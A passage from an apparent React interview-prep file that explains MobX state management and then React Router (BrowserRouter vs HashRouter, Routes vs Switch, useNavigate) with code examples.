      <button onClick={() => counterStore.decrement()}>-</button>
    </div>
  );
});

// Component only re-renders when observables it READS change
// If Counter didn't use doubleCount, it wouldn't re-render when doubleCount changes

Modern MobX 6 Syntax (makeAutoObservable):
-------------------------------------------

import { makeAutoObservable } from 'mobx';

class TodoStore {
  todos = [];
  filter = 'all';
  
  constructor() {
    // Automatically makes everything observable/action/computed
    makeAutoObservable(this);
  }
  
  addTodo(text) {
    this.todos.push({
      id: Date.now(),
      text,
      completed: false
    });
  }
  
  toggleTodo(id) {
    const todo = this.todos.find(t => t.id === id);
    if (todo) {
      todo.completed = !todo.completed;  // Direct mutation
    }
  }
  
  deleteTodo(id) {
    this.todos = this.todos.filter(t => t.id !== id);
  }
  
  setFilter(filter) {
    this.filter = filter;
  }
  
  // Computed value (auto-updates)
  get filteredTodos() {
    switch (this.filter) {
      case 'completed':
        return this.todos.filter(t => t.completed);
      case 'active':
        return this.todos.filter(t => !t.completed);
      default:
        return this.todos;
    }
  }
  
  get stats() {
    return {
      total: this.todos.length,
      completed: this.todos.filter(t => t.completed).length,
      active: this.todos.filter(t => !t.completed).length
    };
  }
}

// Create store
const todoStore = new TodoStore();

// Provider pattern (optional, for multiple stores)
import { createContext, useContext } from 'react';

const StoreContext = createContext(null);

export const StoreProvider = ({ children }) => {
  const store = new TodoStore();
  return (
    <StoreContext.Provider value={store}>
      {children}
    </StoreContext.Provider>
  );
};

export const useStore = () => {
  const store = useContext(StoreContext);
  if (!store) {
    throw new Error('useStore must be used within StoreProvider');
  }
  return store;
};

// Components
const TodoList = observer(() => {
  const store = useStore();
  
  return (
    <div>
      <h2>Todos ({store.stats.total})</h2>
      <div>
        <button onClick={() => store.setFilter('all')}>All</button>
        <button onClick={() => store.setFilter('active')}>Active</button>
        <button onClick={() => store.setFilter('completed')}>Completed</button>
      </div>
      
      <ul>
        {store.filteredTodos.map(todo => (
          <TodoItem key={todo.id} todo={todo} />
        ))}
      </ul>
      
      <p>Active: {store.stats.active} | Completed: {store.stats.completed}</p>
    </div>
  );
});

const TodoItem = observer(({ todo }) => {
  const store = useStore();
  
  return (
    <li>
      <input
        type="checkbox"
        checked={todo.completed}
        onChange={() => store.toggleTodo(todo.id)}
      />
      <span style={{ textDecoration: todo.completed ? 'line-through' : 'none' }}>
        {todo.text}
      </span>
      <button onClick={() => store.deleteTodo(todo.id)}>Delete</button>
    </li>
  );
});

const TodoInput = observer(() => {
  const store = useStore();
  const [text, setText] = useState('');
  
  const handleSubmit = () => {
    if (text.trim()) {
      store.addTodo(text);
      setText('');
    }
  };
  
  return (
    <div>
      <input
        value={text}
        onChange={e => setText(e.target.value)}
        onKeyPress={e => e.key === 'Enter' && handleSubmit()}
      />
      <button onClick={handleSubmit}>Add Todo</button>
    </div>
  );
});

Reactions (Side Effects):
--------------------------

import { autorun, reaction, when } from 'mobx';

// 1. autorun: Runs immediately and whenever observables change
const dispose = autorun(() => {
  console.log('Count changed:', counterStore.count);
  // Automatically tracks counterStore.count dependency
});

// Stop tracking
dispose();

// 2. reaction: Runs only when specific data changes
const dispose2 = reaction(
  // Data function (what to track)
  () => todoStore.todos.length,
  // Effect function (what to do)
  (length) => {
    console.log('Todos count changed:', length);
    localStorage.setItem('todosCount', length);
  }
);

// 3. when: Runs once when condition becomes true
when(
  // Predicate
  () => todoStore.todos.length > 10,
  // Effect
  () => {
    console.log('You have more than 10 todos!');
  }
);

// Async when
await when(() => userStore.isLoggedIn);
console.log('User is now logged in');

Async Actions:
--------------

import { makeAutoObservable, runInAction } from 'mobx';

class UserStore {
  users = [];
  loading = false;
  error = null;
  
  constructor() {
    makeAutoObservable(this);
  }
  
  async fetchUsers() {
    this.loading = true;
    this.error = null;
    
    try {
      const response = await fetch('/api/users');
      const users = await response.json();
      
      // Use runInAction for async state updates
      runInAction(() => {
        this.users = users;
        this.loading = false;
      });
    } catch (error) {
      runInAction(() => {
        this.error = error.message;
        this.loading = false;
      });
    }
  }
  
  // Alternative: flow (generator function)
  fetchUsers = flow(function* () {
    this.loading = true;
    this.error = null;
    
    try {
      const response = yield fetch('/api/users');
      const users = yield response.json();
      
      // No runInAction needed with flow
      this.users = users;
      this.loading = false;
    } catch (error) {
      this.error = error.message;
      this.loading = false;
    }
  });
}

const UserList = observer(() => {
  const store = useStore();
  
  useEffect(() => {
    store.fetchUsers();
  }, [store]);
  
  if (store.loading) return <div>Loading...</div>;
  if (store.error) return <div>Error: {store.error}</div>;
  
  return (
    <ul>
      {store.users.map(user => (
        <li key={user.id}>{user.name}</li>
      ))}
    </ul>
  );
});

Observable Arrays, Objects, Maps, Sets:
----------------------------------------

import { observable, makeObservable } from 'mobx';

class DataStore {
  // Observable array
  items = observable.array([1, 2, 3]);
  
  // Observable object
  user = observable.object({
    name: 'Alice',
    age: 30
  });
  
  // Observable Map
  usersById = observable.map();
  
  // Observable Set
  tags = observable.set(['react', 'mobx']);
  
  constructor() {
    makeObservable(this);
  }
  
  addItem(item) {
    this.items.push(item);  // Triggers observers
  }
  
  updateUser(key, value) {
    this.user[key] = value;  // Triggers observers
  }
  
  addUser(id, user) {
    this.usersById.set(id, user);  // Triggers observers
  }
  
  addTag(tag) {
    this.tags.add(tag);  // Triggers observers
  }
}

Computed Values with Arguments:
--------------------------------

class ProductStore {
  products = [];
  
  constructor() {
    makeAutoObservable(this);
  }
  
  // Computed with parameter (use function)
  getProductsByCategory(category) {
    return this.products.filter(p => p.category === category);
  }
  
  // Or use computedFn from mobx-utils
  getProductsByCategory = computedFn((category) => {
    return this.products.filter(p => p.category === category);
  });
}

Local Observable State (without store):
----------------------------------------

import { useLocalObservable } from 'mobx-react-lite';

const Counter = observer(() => {
  const state = useLocalObservable(() => ({
    count: 0,
    increment() {
      this.count++;
    },
    decrement() {
      this.count--;
    },
    get doubleCount() {
      return this.count * 2;
    }
  }));
  
  return (
    <div>
      <h1>{state.count}</h1>
      <h2>{state.doubleCount}</h2>
      <button onClick={() => state.increment()}>+</button>
      <button onClick={() => state.decrement()}>-</button>
    </div>
  );
});

MobX vs Redux:
--------------

MobX:
✅ Less boilerplate (no actions/reducers)
✅ Direct mutations allowed (store.count++)
✅ Automatic dependency tracking
✅ Object-oriented
✅ Computed values built-in
✅ Better for rapid development
❌ Less predictable (implicit reactivity)
❌ Smaller ecosystem
❌ Can be "magical" (harder to debug)

Redux:
✅ Predictable (explicit actions)
✅ Time-travel debugging
✅ Strict patterns
✅ Huge ecosystem
✅ Better for large teams
❌ More boilerplate
❌ Immutable updates required
❌ Manual optimization (useMemo, reselect)

Code Comparison:
----------------

// Redux
const ADD_TODO = 'ADD_TODO';

const addTodo = (text) => ({
  type: ADD_TODO,
  payload: { id: Date.now(), text, completed: false }
});

function todosReducer(state = [], action) {
  switch (action.type) {
    case ADD_TODO:
      return [...state, action.payload];  // Immutable
    default:
      return state;
  }
}

const TodoList = () => {
  const todos = useSelector(state => state.todos);
  const dispatch = useDispatch();
  
  return (
    <button onClick={() => dispatch(addTodo('New todo'))}>
      Add
    </button>
  );
};

// MobX
class TodoStore {
  todos = [];
  
  constructor() {
    makeAutoObservable(this);
  }
  
  addTodo(text) {
    this.todos.push({  // Mutable!
      id: Date.now(),
      text,
      completed: false
    });
  }
}

const TodoList = observer(() => {
  const store = useStore();
  
  return (
    <button onClick={() => store.addTodo('New todo')}>
      Add
    </button>
  );
});

Performance Optimization:
-------------------------

// MobX automatically optimizes re-renders
// Only components that read changed observables re-render

const TodoApp = observer(() => {
  const store = useStore();
  
  return (
    <div>
      <TodoStats />  {/* Only re-renders if stats change * /}
      <TodoList />   {/* Only re-renders if todos change * /}
      <TodoFilter /> {/* Only re-renders if filter changes * /}
    </div>
  );
});

// Fine-grained control with observer on specific parts
const TodoItem = ({ todo }) => {
  return (
    <li>
      {/* Only this span re-renders when todo.text changes * /}
      {observer(() => <span>{todo.text}</span>)}
      
      {/* Only this input re-renders when todo.completed changes * /}
      {observer(() => (
        <input
          type="checkbox"
          checked={todo.completed}
          onChange={() => todo.completed = !todo.completed}
        />
      ))}
    </li>
  );
};

DevTools:
---------

// Install mobx-react-devtools
import { configure } from 'mobx';

// Enable strict mode (recommended)
configure({
  enforceActions: 'always',  // Require actions for state changes
  computedRequiresReaction: true,  // Computed must be read by reaction
  reactionRequiresObservable: true,  // Reactions must access observables
  observableRequiresReaction: true  // Observables must be read by reactions
});

When to Use MobX:
-----------------

✅ Rapid development, less boilerplate
✅ Object-oriented codebase
✅ Complex computed values
✅ Prefer automatic reactivity
✅ Coming from Vue/Angular
✅ Small to medium apps
✅ Need fine-grained reactivity

When NOT to use MobX:
---------------------

❌ Need strict patterns (use Redux)
❌ Large team needs predictability
❌ Time-travel debugging required
❌ Team unfamiliar with OOP/observables
❌ Want explicit action tracking

Summary:

MobX = Automatic reactive state management
- Observables: Tracked state
- Actions: Functions that modify state
- Computed: Derived values (auto-update)
- Reactions: Side effects (auto-run)
- Observer: Components that auto re-render
- Less boilerplate than Redux
- Direct mutations allowed
- Automatic dependency tracking
- Great for rapid development
*/




/**
52. What is React Router?
-------------------------

React Router is a standard library for routing in React applications. It enables
navigation between different views/components, manages browser history, and keeps
UI in sync with the URL.

Core Purpose:
- Single Page Application (SPA) routing
- Declarative routing (routes defined as components)
- URL parameter handling
- Nested routes
- Route protection
- Lazy loading

Installation:
-------------

npm install react-router-dom

Basic Setup:
------------

import { BrowserRouter, Routes, Route, Link } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <nav>
        <Link to="/">Home</Link>
        <Link to="/about">About</Link>
        <Link to="/contact">Contact</Link>
      </nav>
      
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/contact" element={<Contact />} />
        <Route path="*" element={<NotFound />} />
      </Routes>
    </BrowserRouter>
  );
}

function Home() {
  return <h1>Home Page</h1>;
}

function About() {
  return <h1>About Page</h1>;
}

function Contact() {
  return <h1>Contact Page</h1>;
}

function NotFound() {
  return <h1>404 - Page Not Found</h1>;
}

Key Components:
---------------

1. BrowserRouter / HashRouter: Wrapper component
2. Routes: Container for Route components
3. Route: Defines path-to-component mapping
4. Link / NavLink: Navigation links
5. Navigate: Redirect component
6. Outlet: Renders child routes

Dynamic Routes with Parameters:
--------------------------------

import { useParams, useSearchParams } from 'react-router-dom';

function App() {
  return (
    <Routes>
      {/* URL parameters * /}
      <Route path="/users/:userId" element={<UserProfile />} />
      <Route path="/products/:category/:productId" element={<Product />} />
      
      {/* Query parameters * /}
      <Route path="/search" element={<SearchResults />} />
    </Routes>
  );
}

// Access URL parameters
function UserProfile() {
  const { userId } = useParams();
  
  return <h1>User Profile: {userId}</h1>;
  // URL: /users/123 → userId = "123"
}

function Product() {
  const { category, productId } = useParams();
  
  return (
    <div>
      <h1>Category: {category}</h1>
      <h2>Product ID: {productId}</h2>
    </div>
  );
  // URL: /products/electronics/456
  // category = "electronics", productId = "456"
}

// Access query parameters
function SearchResults() {
  const [searchParams, setSearchParams] = useSearchParams();
  const query = searchParams.get('q');
  const page = searchParams.get('page') || '1';
  
  return (
    <div>
      <h1>Search: {query}</h1>
      <p>Page: {page}</p>
      <button onClick={() => setSearchParams({ q: query, page: '2' })}>
        Next Page
      </button>
    </div>
  );
  // URL: /search?q=laptop&page=1
}

Navigation Components:
----------------------

// Link - basic navigation
<Link to="/about">About</Link>
<Link to="/users/123">User 123</Link>

// NavLink - styled when active
<NavLink
  to="/about"
  className={({ isActive }) => isActive ? 'active' : ''}
  style={({ isActive }) => ({ color: isActive ? 'red' : 'blue' })}
>
  About
</NavLink>

// Link with state
<Link to="/profile" state={{ from: 'dashboard' }}>
  Go to Profile
</Link>

function Profile() {
  const location = useLocation();
  const from = location.state?.from;
  
  return <p>Came from: {from}</p>;
}

Hooks:
------

// useNavigate - programmatic navigation
const navigate = useNavigate();
navigate('/home');
navigate(-1);  // Go back
navigate(1);   // Go forward

// useLocation - current location info
const location = useLocation();
console.log(location.pathname);  // "/users/123"
console.log(location.search);    // "?page=2"
console.log(location.hash);      // "#section1"
console.log(location.state);     // Custom state

// useParams - URL parameters
const { userId } = useParams();

// useSearchParams - query parameters
const [searchParams, setSearchParams] = useSearchParams();

// useMatch - check if route matches
const match = useMatch('/users/:userId');
if (match) {
  console.log('User ID:', match.params.userId);
}

Real-World Example:
-------------------

import {
  BrowserRouter,
  Routes,
  Route,
  Link,
  NavLink,
  useParams,
  useNavigate,
  Navigate
} from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <Layout>
        <Routes>
          {/* Public routes * /}
          <Route path="/" element={<Home />} />
          <Route path="/login" element={<Login />} />
          <Route path="/register" element={<Register />} />
          
          {/* Protected routes * /}
          <Route path="/dashboard" element={<ProtectedRoute><Dashboard /></ProtectedRoute>} />
          <Route path="/profile" element={<ProtectedRoute><Profile /></ProtectedRoute>} />
          
          {/* Dynamic routes * /}
          <Route path="/users/:userId" element={<UserProfile />} />
          <Route path="/posts/:postId" element={<PostDetail />} />
          
          {/* Nested routes * /}
          <Route path="/products" element={<Products />}>
            <Route index element={<ProductList />} />
            <Route path=":productId" element={<ProductDetail />} />
            <Route path="new" element={<NewProduct />} />
          </Route>
          
          {/* 404 * /}
          <Route path="*" element={<NotFound />} />
        </Routes>
      </Layout>
    </BrowserRouter>
  );
}

function Layout({ children }) {
  return (
    <div>
      <nav>
        <NavLink to="/">Home</NavLink>
        <NavLink to="/dashboard">Dashboard</NavLink>
        <NavLink to="/profile">Profile</NavLink>
      </nav>
      <main>{children}</main>
    </div>
  );
}

Summary:

React Router provides:
- Declarative routing
- Dynamic URL parameters
- Nested routes
- Programmatic navigation
- Route protection
- Browser history management
- SPA navigation without page refresh
*/


/**
53. What is the difference between BrowserRouter and HashRouter?
-----------------------------------------------------------------

BrowserRouter and HashRouter are two router implementations that handle URLs
differently.

BrowserRouter:
--------------

Uses HTML5 History API (pushState, replaceState, popstate)
URLs look clean and normal.

URL Format:
http://example.com/users/123
http://example.com/products/electronics

import { BrowserRouter } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
      </Routes>
    </BrowserRouter>
  );
}

How it works:
- Uses browser History API
- URLs: /home, /about, /users/123
- Requires server configuration
- Modern, recommended approach

Server Configuration Required:
-------------------------------

BrowserRouter needs server to redirect all routes to index.html

// Apache (.htaccess)
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteBase /
  RewriteRule ^index\.html$ - [L]
  RewriteCond %{REQUEST_FILENAME} !-f
  RewriteCond %{REQUEST_FILENAME} !-d
  RewriteRule . /index.html [L]
</IfModule>

// Nginx
location / {
  try_files $uri /index.html;
}

// Express.js
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

// Webpack Dev Server
devServer: {
  historyApiFallback: true
}

HashRouter:
-----------

Uses URL hash (#) to keep UI in sync with URL.
URLs have # symbol.

URL Format:
http://example.com/#/users/123
http://example.com/#/products/electronics

import { HashRouter } from 'react-router-dom';

function App() {
  return (
    <HashRouter>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
      </Routes>
    </HashRouter>
  );
}

How it works:
- Uses URL hash (after #)
- URLs: /#/home, /#/about, /#/users/123
- No server configuration needed
- Hash part never sent to server
- Older approach, legacy support

Direct Comparison:
------------------

Feature              | BrowserRouter        | HashRouter
---------------------|----------------------|--------------------
URL Format           | /users/123           | /#/users/123
Appearance           | Clean, professional  | Has # symbol
SEO                  | Better               | Worse (hash ignored)
Server Config        | Required             | Not required
Browser Support      | Modern browsers      | All browsers
Use Case             | Production apps      | Static hosting, legacy
History API          | Yes                  | No
Shareable URLs       | Yes                  | Yes (but ugly)
Analytics            | Works normally       | May need special config

Example URLs:
-------------

BrowserRouter:
http://example.com/
http://example.com/about
http://example.com/users/123
http://example.com/products?category=electronics
http://example.com/posts/456#comments

HashRouter:
http://example.com/#/
http://example.com/#/about
http://example.com/#/users/123
http://example.com/#/products?category=electronics
http://example.com/#/posts/456

Why HashRouter works without server config:
--------------------------------------------

Browser behavior:
- Everything after # is NOT sent to server
- http://example.com/#/about → Server only sees http://example.com/
- Server always returns index.html
- React Router handles /#/about on client side

BrowserRouter behavior:
- http://example.com/about → Server sees /about
- If server not configured, returns 404
- Need to configure server to return index.html for all routes

Switching between them:
-----------------------

// Just swap the router component - rest of code stays same!

// BrowserRouter
import { BrowserRouter as Router } from 'react-router-dom';

function App() {
  return (
    <Router>
      {/* Routes * /}
    </Router>
  );
}

// HashRouter
import { HashRouter as Router } from 'react-router-dom';

function App() {
  return (
    <Router>
      {/* Same routes work! * /}
    </Router>
  );
}

Custom basename:
----------------

// BrowserRouter with basename (app in subdirectory)
<BrowserRouter basename="/app">
  <Routes>
    <Route path="/" element={<Home />} />
    {/* Actual URL: http://example.com/app/ * /}
    <Route path="/about" element={<About />} />
    {/* Actual URL: http://example.com/app/about * /}
  </Routes>
</BrowserRouter>

// HashRouter with basename
<HashRouter basename="/app">
  <Routes>
    <Route path="/" element={<Home />} />
    {/* Actual URL: http://example.com/app#/ * /}
    <Route path="/about" element={<About />} />
    {/* Actual URL: http://example.com/app#/about * /}
  </Routes>
</HashRouter>

MemoryRouter (bonus):
---------------------

Keeps history in memory (no URL changes).
Used for testing or non-browser environments.

import { MemoryRouter } from 'react-router-dom';

// Testing
test('renders home page', () => {
  render(
    <MemoryRouter initialEntries={['/']}>
      <App />
    </MemoryRouter>
  );
});

// React Native
import { NativeRouter } from 'react-router-native';

When to use each:
-----------------

Use BrowserRouter when:
✅ Modern production apps
✅ Have control over server
✅ Want clean URLs
✅ SEO matters
✅ Professional appearance needed
✅ Can configure server redirects

Use HashRouter when:
✅ Static file hosting (GitHub Pages, S3)
✅ No server configuration access
✅ Legacy browser support needed
✅ Quick prototypes
✅ Local file:// protocol
✅ Electron apps

Use MemoryRouter when:
✅ Testing components
✅ React Native apps
✅ Non-browser environments
✅ Don't want URL changes

Real-world example:
-------------------

// Production app (BrowserRouter)
import { BrowserRouter } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/products/:id" element={<Product />} />
      </Routes>
    </BrowserRouter>
  );
}

// URLs: example.com/products/123
// Server config: Redirect all to index.html

// GitHub Pages deployment (HashRouter)
import { HashRouter } from 'react-router-dom';

function App() {
  return (
    <HashRouter>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/products/:id" element={<Product />} />
      </Routes>
    </HashRouter>
  );
}

// URLs: username.github.io/repo/#/products/123
// No server config needed!

Summary:

BrowserRouter:
- Clean URLs (/about)
- Requires server config
- Better SEO
- Modern, recommended
- Production apps

HashRouter:
- Hash URLs (/#/about)
- No server config needed
- Works on static hosts
- Legacy support
- Quick prototypes

Choose BrowserRouter unless you can't configure server!
*/


/**
54. What are Route and Switch (or Routes in v6)?
------------------------------------------------

Route defines a mapping between a URL path and a component.
Switch (v5) / Routes (v6) is a container that renders the first matching Route.

React Router v6 (Current):
--------------------------

Routes component replaces Switch with improved features.

import { Routes, Route } from 'react-router-dom';

function App() {
  return (
    <Routes>
      <Route path="/" element={<Home />} />
      <Route path="/about" element={<About />} />
      <Route path="/contact" element={<Contact />} />
      <Route path="/users/:userId" element={<UserProfile />} />
      <Route path="*" element={<NotFound />} />
    </Routes>
  );
}

Key Differences v5 vs v6:
--------------------------

React Router v5 (Old):
----------------------

import { Switch, Route } from 'react-router-dom';

function App() {
  return (
    <Switch>
      {/* component prop * /}
      <Route path="/" exact component={Home} />
      
      {/* render prop * /}
      <Route path="/about" render={() => <About />} />
      
      {/* children prop * /}
      <Route path="/contact">
        <Contact />
      </Route>
      
      {/* Dynamic route * /}
      <Route path="/users/:userId" component={UserProfile} />
      
      {/* 404 - no path * /}
      <Route component={NotFound} />
    </Switch>
  );
}

// Need exact prop for exact matches
<Route exact path="/" component={Home} />

React Router v6 (New):
----------------------

import { Routes, Route } from 'react-router-dom';

function App() {
  return (
    <Routes>
      {/* element prop (JSX) * /}
      <Route path="/" element={<Home />} />
      <Route path="/about" element={<About />} />
      <Route path="/contact" element={<Contact />} />
      
      {/* Dynamic route * /}
      <Route path="/users/:userId" element={<UserProfile />} />
      
      {/* 404 - wildcard * /}
      <Route path="*" element={<NotFound />} />
    </Routes>
  );
}

// Exact matching by default (no exact prop needed!)
// Best match automatically selected

Comparison Table:
-----------------

Feature              | v5 (Switch)          | v6 (Routes)
---------------------|----------------------|-------------------
Component name       | Switch               | Routes
Prop for component   | component/render     | element (JSX)
Exact matching       | Need exact prop      | Default behavior
Match algorithm      | First match          | Best match
Relative paths       | No                   | Yes
Nested routes        | Complex              | Simple with Outlet
Multiple rendering   | No (first match)     | No (best match)
Route ordering       | Matters a lot        | Matters less

Route Component Props:
----------------------

// v6 Route props
<Route
  path="/users/:userId"           // URL pattern
  element={<UserProfile />}        // Component to render
  index                            // Default child route
  caseSensitive                    // Case-sensitive matching
/>

// Path patterns
<Route path="/" />                      // Root
<Route path="/about" />                 // Static path
<Route path="/users/:userId" />         // Dynamic segment
<Route path="/posts/:id/:slug" />       // Multiple params
<Route path="/files/*" />               // Wildcard (rest of path)
<Route path="*" />                      // Catch all (404)

Index Routes:
-------------

// Default child route
<Routes>
  <Route path="/products" element={<ProductLayout />}>
    <Route index element={<ProductList />} />
    {/* When URL is /products, show ProductList * /}
    <Route path=":id" element={<ProductDetail />} />
  </Route>
</Routes>

Multiple Routes Containers:
----------------------------

// Can have multiple Routes in different parts of app
function App() {
  return (
    <div>
      <Header>
        <Routes>
          <Route path="/login" element={<LoginButton />} />
          <Route path="*" element={<LogoutButton />} />
        </Routes>
      </Header>
      
      <Sidebar>
        <Routes>
          <Route path="/dashboard" element={<DashboardNav />} />
          <Route path="/settings" element={<SettingsNav />} />
        </Routes>
      </Sidebar>
      
      <Main>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/settings" element={<Settings />} />
        </Routes>
      </Main>
    </div>
  );
}

Route Matching Examples:
-------------------------

// v6: Best match (not first match)
<Routes>
  <Route path="/users" element={<Users />} />
  <Route path="/users/:userId" element={<UserProfile />} />
  <Route path="/users/new" element={<NewUser />} />
</Routes>

// URL: /users → Users
// URL: /users/123 → UserProfile (userId=123)
// URL: /users/new → NewUser (specific route wins over dynamic!)

// v5 needed careful ordering
<Switch>
  <Route path="/users/new" component={NewUser} />
  {/* Must be BEFORE :userId route * /}
  <Route path="/users/:userId" component={UserProfile} />
  <Route path="/users" component={Users} />
</Switch>

Wildcard Routes:
----------------

<Routes>
  {/* Matches /files/a * /}
  <Route path="/files/*" element={<FileManager />} />
  
  {/* Inside FileManager, can have nested routes * /}
</Routes>

function FileManager() {
  return (
    <Routes>
      <Route path="/" element={<FileList />} />
      <Route path="/:fileId" element={<FileDetail />} />
    </Routes>
  );
}

Layout Routes:
--------------

// Route that wraps other routes
<Routes>
  <Route path="/" element={<Layout />}>
    {/* Child routes * /}
    <Route index element={<Home />} />
    <Route path="about" element={<About />} />
    <Route path="contact" element={<Contact />} />
  </Route>
</Routes>

function Layout() {
  return (
    <div>
      <Header />
      <Sidebar />
      <main>
        <Outlet />  {/* Child routes render here * /}
      </main>
      <Footer />
    </div>
  );
}

No Match (404) Routes:
----------------------

// v6: Use * wildcard at end
<Routes>
  <Route path="/" element={<Home />} />
  <Route path="/about" element={<About />} />
  <Route path="*" element={<NotFound />} />
</Routes>

// v5: Route with no path
<Switch>
  <Route path="/" exact component={Home} />
  <Route path="/about" component={About} />
  <Route component={NotFound} />
</Switch>

Relative Routes:
----------------

// v6: Relative paths work!
<Route path="users" element={<UsersLayout />}>
  <Route path="list" element={<UserList />} />
  {/* Full path: /users/list * /}
  
  <Route path=":userId" element={<UserProfile />} />
  {/* Full path: /users/:userId * /}
  
  <Route path=":userId/edit" element={<EditUser />} />
  {/* Full path: /users/:userId/edit * /}
</Route>

Passing Props to Route Elements:
---------------------------------

// v6: Can pass props directly in JSX
<Route path="/profile" element={<Profile user={user} theme={theme} />} />

// v5: Had to use render prop
<Route path="/profile" render={(props) => (
  <Profile {...props} user={user} theme={theme} />
)} />

Route Configuration (Object-based):
------------------------------------

import { useRoutes } from 'react-router-dom';

function App() {
  const routes = useRoutes([
    {
      path: '/',
      element: <Layout />,
      children: [
        { index: true, element: <Home /> },
        { path: 'about', element: <About /> },
        { path: 'contact', element: <Contact /> },
      ]
    },
    {
      path: '/users',
      element: <UsersLayout />,
      children: [
        { index: true, element: <UserList /> },
        { path: ':userId', element: <UserProfile /> },
      ]
    },
    { path: '*', element: <NotFound /> }
  ]);
  
  return routes;
}

Route Guards / Protection:
---------------------------

<Routes>
  {/* Public routes * /}
  <Route path="/" element={<Home />} />
  <Route path="/login" element={<Login />} />
  
  {/* Protected routes * /}
  <Route
    path="/dashboard"
    element={
      <RequireAuth>
        <Dashboard />
      </RequireAuth>
    }
  />
  
  <Route
    path="/profile"
    element={
      <RequireAuth>
        <Profile />
      </RequireAuth>
    }
  />
</Routes>

function RequireAuth({ children }) {
  const { isAuthenticated } = useAuth();
  const location = useLocation();
  
  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  return children;
}

Summary:

v5 (Switch):
- Renders first matching route
- Need exact prop for exact matches
- Order matters a lot
- component/render props

v6 (Routes):
- Renders best matching route
- Exact by default
- Smarter matching algorithm
- element prop (JSX)
- Relative paths support
- Simpler nested routes
- Better TypeScript support

v6 is a complete rewrite with better API and performance!
*/


/**
55. What is useNavigate and how do you programmatically navigate?
-----------------------------------------------------------------

useNavigate is a hook that returns a function to programmatically navigate between
routes. It replaces useHistory from v5.

Basic Usage:
------------

import { useNavigate } from 'react-router-dom';

function LoginForm() {
  const navigate = useNavigate();
  
  const handleLogin = async (credentials) => {
    const success = await loginAPI(credentials);
    
    if (success) {
      navigate('/dashboard');  // Navigate to dashboard
    }
  };
  
  return (
    <form onSubmit={handleLogin}>
      {/* form fields * /}
    </form>
  );
}

Navigation Methods:
-------------------

function NavigationExamples() {
  const navigate = useNavigate();
  
  // 1. Navigate to path
  const goToHome = () => {
    navigate('/');
  };
  
  // 2. Navigate with params
  const goToUser = (userId) => {
    navigate(`/users/${userId}`);
  };
  
  // 3. Navigate with query params
  const goToSearch = (query) => {
    navigate(`/search?q=${query}`);
  };
  
  // 4. Navigate with state
  const goToProfile = () => {
    navigate('/profile', {
      state: { from: 'dashboard', userId: 123 }
    });
  };
  
  // 5. Replace current entry (no back button)
  const replaceRoute = () => {
    navigate('/new-page', { replace: true });
  };
  
  // 6. Go back
  const goBack = () => {
    navigate(-1);
  };
  
  // 7. Go forward
  const goForward = () => {
    navigate(1);
  };
  
  // 8. Go back 2 pages
  const goBack2 = () => {
    navigate(-2);
  };
  
  // 9. Relative navigation
  const goToRelative = () => {
    navigate('..'); // Parent route
    navigate('../sibling'); // Sibling route
    navigate('child'); // Child route
  };
  
  return (
    <div>
      <button onClick={goToHome}>Home</button>
      <button onClick={() => goToUser(123)}>User 123</button>
      <button onClick={goBack}>Back</button>
      <button onClick={goForward}>Forward</button>
    </div>
  );
}

Common Patterns:
----------------

// 1. Navigate after form submission
function CreatePostForm() {
  const navigate = useNavigate();
  
  const handleSubmit = async (formData) => {
    const post = await createPost(formData);
    
    // Redirect to new post
    navigate(`/posts/${post.id}`);
  };
  
  return <form onSubmit={handleSubmit}>{/* ... * /}</form>;
}

// 2. Navigate after authentication
function Login() {
  const navigate = useNavigate();
  const location = useLocation();
  
  const handleLogin = async (credentials) => {
    await loginAPI(credentials);
    
    // Redirect to page they tried to access or dashboard
    const from = location.state?.from || '/dashboard';
    navigate(from, { replace: true });
  };
  
  return <LoginForm onSubmit={handleLogin} />;
}

// 3. Navigate with confirmation
function DeleteButton({ itemId }) {
  const navigate = useNavigate();
  
  const handleDelete = async () => {
    if (confirm('Are you sure?')) {
      await deleteItem(itemId);
      navigate('/items'); // Go back to list
    }
  };
  
  return <button onClick={handleDelete}>Delete</button>;
}

// 4. Conditional navigation
function SubmitButton() {
  const navigate = useNavigate();
  
  const handleClick = async () => {
    const result = await saveData();
    
    if (result.success) {
      navigate('/success');
    } else {
      navigate('/error', { state: { error: result.error } });
    }
  };
  
  return <button onClick={handleClick}>Submit</button>;
}

// 5. Navigate with search params
function FilteredSearch() {
  const navigate = useNavigate();
  const [filters, setFilters] = useState({});
  
  const applyFilters = () => {
    const searchParams = new URLSearchParams(filters).toString();
    navigate(`/search?${searchParams}`);
  };
  
  return <button onClick={applyFilters}>Apply Filters</button>;
}

Navigate vs Link:
-----------------

// Link: For user clicks (declarative)
<Link to="/about">About</Link>

// useNavigate: For programmatic navigation (imperative)
const navigate = useNavigate();
const handleComplete = () => {
  // After some logic
  navigate('/complete');
};

Navigation Options:
-------------------

navigate(to, options);

// Options object:
{
  replace: boolean,    // Replace history entry instead of push
  state: any,          // State to pass to next route
  preventScrollReset: boolean  // Keep scroll position
}

// Examples
navigate('/profile', {
  replace: true,  // Can't go back to previous page
  state: { userId: 123 },  // Pass data
  preventScrollReset: true  // Don't scroll to top
});

Reading Navigation State:
-------------------------

import { useLocation } from 'react-router-dom';

function Profile() {
  const location = useLocation();
  
  // Access state passed via navigate
  const userId = location.state?.userId;
  const from = location.state?.from;
  
  return (
    <div>
      <p>User ID: {userId}</p>
      <p>Came from: {from}</p>
    </div>
  );
}

// Navigate with state
navigate('/profile', {
  state: { userId: 123, from: 'dashboard' }
});

Replacing vs Pushing:
---------------------

// Push (default): Adds to history stack
navigate('/page1');  // Can go back
navigate('/page2');  // Can go back to page1
navigate('/page3');  // Can go back to page2

// Replace: Replaces current entry
navigate('/page1', { replace: true });  // Can't go back to previous
